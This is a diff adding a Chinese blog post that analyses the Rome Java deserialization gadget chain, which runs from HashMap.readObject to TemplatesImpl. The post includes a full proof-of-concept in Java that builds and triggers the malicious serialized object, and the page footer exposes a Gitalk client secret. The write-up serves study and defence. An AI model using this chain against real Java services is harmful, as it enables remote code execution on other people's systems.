@@ -1,0 +1,406 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Rome反序列化链分析 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Rome反序列化链分析 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="0x00前置知识
+ObjectBean
+com.sun.syndication.feed.impl.ObjectBean是Rome提供的一个封装类型，初始化时可以对一个Class和一个Object对象进行封装。
+ObjectBean有三个成..." />
+    <meta name="keywords" content="Rome,Java,反序列化" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Rome反序列化链分析
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-11-04
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/rome/" class="post-tag">
+                  # Rome
+                </a>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Jb2lgvYBPU/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="0x00前置知识">0x00前置知识</h1>
+<h2 id="objectbean">ObjectBean</h2>
+<p><code>com.sun.syndication.feed.impl.ObjectBean</code>是<code>Rome</code>提供的一个封装类型，初始化时可以对一个<code>Class</code>和一个<code>Object</code>对象进行封装。</p>
+<p>ObjectBean有三个成员变量，分别是 EqualsBean/ToStringBean/CloneableBean 类，这三个类为 ObjectBean 提供了 <code>equals</code>、<code>toString</code>、<code>clone</code> 以及 <code>hashCode</code> 方法。</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/04/8908c01942c4a.png" alt="image-20221104153248687" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/04/6848158071732.png" alt="image-20221104153448029" loading="lazy"></figure>
+<p>这里来看一下<code>ObjectBean</code>的<code>hashCode()</code>，它会去调用<code>EqualsBean</code>的<code>beanHashCode()</code></p>
+<pre><code class="language-java">public int hashCode() {
+    return _equalsBean.beanHashCode();
+}
+</code></pre>
+<p>跟进看一下<code>beanHashCode()</code></p>
+<pre><code class="language-java">public int beanHashCode() {
+    return _obj.toString().hashCode();
+}
+</code></pre>
+<p>这里会调用<code>_obj</code>的<code>toString()</code>方法，而这个<code>_obj</code>是来自于EqualsBean中的，是<strong>可控的</strong>，这也就是触发利用链的地方。</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/04/d4d13f71f7981.png" alt="image-20221104154745747" loading="lazy"></figure>
+<h2 id="tostringbean">ToStringBean</h2>
+<p><code>com.sun.syndication.feed.impl.ToStringBean</code> 这个类提供了<code>toString()</code>，一共有两个<code>toString()</code>方法，第一个是无参的方法获取传入的obj对象的类名，并且传入第二个<code>toString()</code>方法</p>
+<pre><code class="language-java">public String toString() {
+    Stack stack = (Stack) PREFIX_TL.get();
+    String[] tsInfo = (String[]) ((stack.isEmpty()) ? null : stack.peek());
+    String prefix;
+    if (tsInfo==null) {
+        String className = _obj.getClass().getName();
+        prefix = className.substring(className.lastIndexOf(&quot;.&quot;)+1);
+    }
+    else {
+        prefix = tsInfo[0];
+        tsInfo[1] = prefix;
+    }
+    return toString(prefix);
+}
+</code></pre>
+<pre><code class="language-java">private String toString(String prefix) {
+    StringBuffer sb = new StringBuffer(128);
+    try {
+        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);
+        if (pds!=null) {
+            for (int i=0;i&lt;pds.length;i++) {
+                String pName = pds[i].getName();
+                Method pReadMethod = pds[i].getReadMethod();
+                if (pReadMethod!=null &amp;&amp;                             // ensure it has a getter method
+                    pReadMethod.getDeclaringClass()!=Object.class &amp;&amp; // filter Object.class getter methods
+                    pReadMethod.getParameterTypes().length==0) {     // filter getter methods that take parameters
+                    Object value = pReadMethod.invoke(_obj,NO_PARAMS);
+                    printProperty(sb,prefix+&quot;.&quot;+pName,value);
+                }
+            }
+        }
+    }
+    catch (Exception ex) {
+        sb.append(&quot;\n\nEXCEPTION: Could not complete &quot;+_obj.getClass()+&quot;.toString(): &quot;+ex.getMessage()+&quot;\n&quot;);
+    }
+    return sb.toString();
+}
+</code></pre>
+<p>这里调用<code>BeanIntrospector.getPropertyDescriptors()</code> 来获取 <code>_beanClass</code> 的全部 getter/setter 方法。</p>
+<pre><code class="language-java">private static PropertyDescriptor[] getPDs(Class klass) throws IntrospectionException {
+    Method[] methods = klass.getMethods();
+    Map getters = getPDs(methods,false);
+    Map setters = getPDs(methods,true);
+    List pds     = merge(getters,setters);
+    PropertyDescriptor[] array = new PropertyDescriptor[pds.size()];
+    pds.toArray(array);
+    return array;
+}
+</code></pre>
+<p>然后调用其中的无参方法，可以用来触发TemplatesImpl 的利用链</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/04/bb61a823d66da.png" alt="image-20221104160631589" loading="lazy"></figure>
+<h1 id="0x01攻击构造">0x01攻击构造</h1>
+<p>首先，生成恶意的TemplatesImpl类</p>
+<pre><code class="language-java">byte[] evilCode = SerializeUtil.getEvilCode();
+TemplatesImpl templates = new TemplatesImpl();
+SerializeUtil.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{evilCode});
+SerializeUtil.setFieldValue(templates, &quot;_name&quot;, &quot;le1a&quot;);
+SerializeUtil.setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+</code></pre>
+<p>然后把恶意的TemplatesImpl类封装到<code>ToStringBean</code>中，使得最后可以调用<code>ToStringBean#toString()</code>的时候，可以触发getter()方法。</p>
+<pre><code class="language-java">ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
+</code></pre>
+<p>然后把封装好的<code>ToStringBean</code>对象封装到<code>EqualsBean</code>中，使得调用<code>EqualsBean#beanHashCode()</code>的时候，调用的是<code>ToStringBean#toString()</code></p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/04/fd62089fc8610.png" alt="image-20221104161425307" loading="lazy"></figure>
+<pre><code class="language-java">EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
+</code></pre>
+<p>然后实例化一个ObjectBean，先装入无害的1，防止序列化的时候就触发恶意代码</p>
+<pre><code class="language-java">ObjectBean objectBean = new ObjectBean(String.class, &quot;le1a&quot;);
+
+HashMap&lt;ObjectBean, Integer&gt; evilMap = new HashMap&lt;ObjectBean, Integer&gt;();
+evilMap.put(objectBean, 1);
+evilMap.put(objectBean, 1);
+</code></pre>
+<p>然后再通过反射修改ObjectBean中的<code>EqualsBean</code>变量的值为我们构造的恶意<code>EqualsBean</code>对象</p>
+<pre><code class="language-java">SerializeUtil.setFieldValue(objectBean, &quot;_equalsBean&quot;, equalsBean);
+</code></pre>
+<p><strong>完整Poc:</strong></p>
+<pre><code class="language-java">package com.le1a.rome;
+
+import com.le1a.util.SerializeUtil;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.syndication.feed.impl.EqualsBean;
+import com.sun.syndication.feed.impl.ObjectBean;
+import com.sun.syndication.feed.impl.ToStringBean;
+
+import javax.xml.transform.Templates;
+import java.util.HashMap;
+
+public class Rome {
+    public static void main(String[] args) throws Exception {
+        // 生成包含恶意类字节码的 TemplatesImpl 类
+        byte[] evilCode = SerializeUtil.getEvilCode();
+        TemplatesImpl templates = new TemplatesImpl();
+        SerializeUtil.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{evilCode});
+        SerializeUtil.setFieldValue(templates, &quot;_name&quot;, &quot;le1a&quot;);
+        SerializeUtil.setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        // 使用 TemplatesImpl 初始化被包装类，使其 ToStringBean 也使用 TemplatesImpl 初始化
+        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
+        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
+
+        ObjectBean objectBean = new ObjectBean(String.class, &quot;le1a&quot;);
+
+
+        HashMap&lt;ObjectBean, Integer&gt; evilMap = new HashMap&lt;ObjectBean, Integer&gt;();
+        evilMap.put(objectBean, 1);
+        evilMap.put(objectBean, 1);
+
+        SerializeUtil.setFieldValue(objectBean, &quot;_equalsBean&quot;, equalsBean);
+
+
+        byte[] bytes = SerializeUtil.serialize(evilMap);
+        SerializeUtil.unserialize(bytes);
+    }
+}
+</code></pre>
+<h1 id="0x02总结">0x02总结</h1>
+<ol>
+<li>
+<p>大概流程:</p>
+<ul>
+<li>利用<code>HashMap</code>反序列化触发<code>ObjectBean</code>的<code>hashCode()</code>方法，然后触发<code>_equalsBean.beanHashCode()</code>，再触发<code>EqualsBean</code>封装的<code>ToStringBean</code>的<code>toString()</code>方法</li>
+</ul>
+</li>
+<li>
+<p>Gadget:</p>
+<ul>
+<li>kick-off gadget：<code>java.util.HashMap#readObject()</code></li>
+<li>sink gadget：<code>com.sun.syndication.feed.impl.ToStringBean#toString()</code></li>
+<li>chain gadget：<code>com.sun.syndication.feed.impl.ObjectBean#toString()</code></li>
+</ul>
+</li>
+<li>
+<p>调用链:</p>
+<pre><code class="language-java">HashMap.readObject()
+    ObjectBean.hashCode()
+            EqualsBean.beanHashCode()
+                    ToStringBean.toString()
+                        TemplatesImpl.getOutputProperties()
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/04/3c064a3efa1f3.png" alt="image-20221104164201796" loading="lazy"></figure>
+<h1 id="0x03参考">0x03参考</h1>
+<p><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5Drome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0.md">feng</a></p>
+<p><a href="https://su18.org/post/ysoserial-su18-5/#rome">su18</a></p>
+</li>
+</ol>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#0x00%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">0x00前置知识</a>
+<ul>
+<li><a href="#objectbean">ObjectBean</a></li>
+<li><a href="#tostringbean">ToStringBean</a></li>
+</ul>
+</li>
+<li><a href="#0x01%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0">0x01攻击构造</a></li>
+<li><a href="#0x02%E6%80%BB%E7%BB%93">0x02总结</a></li>
+<li><a href="#0x03%E5%8F%82%E8%80%83">0x03参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/jdk7u21/">
+              <h3 class="post-title">
+                JDK7u21反序列化链分析
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
